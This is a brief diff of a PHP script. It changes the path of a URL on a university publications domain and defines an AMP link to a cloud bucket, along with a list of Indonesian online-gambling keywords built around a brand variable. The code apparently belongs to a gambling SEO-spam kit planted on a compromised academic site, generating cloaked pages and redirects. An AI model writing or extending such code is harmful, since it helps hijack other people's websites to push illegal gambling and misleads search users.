@@ -53,7 +53,7 @@ foreach ($lines as $item) {
     }
 }
 
-$url  = "https://openlibrarypublications.telkomuniversity.ac.id/public_html/classes/?product=" . $brand;
+$url  = "https://openlibrarypublications.telkomuniversity.ac.id/classes/?product=" . $brand;
 $amp  = "https://pub-adb3631e554745889c000bf8f9fa0035.r2.dev/pt3.html?id=" . $brand;
 $kw   = "$brand, slot $brand, judi $brand, login $brand,  $brand, livechat $brand, situs $brand, agen $brand, slot online $brand, rtp $brand, bandar $brand, daftar $BRANDS.";
 ?>
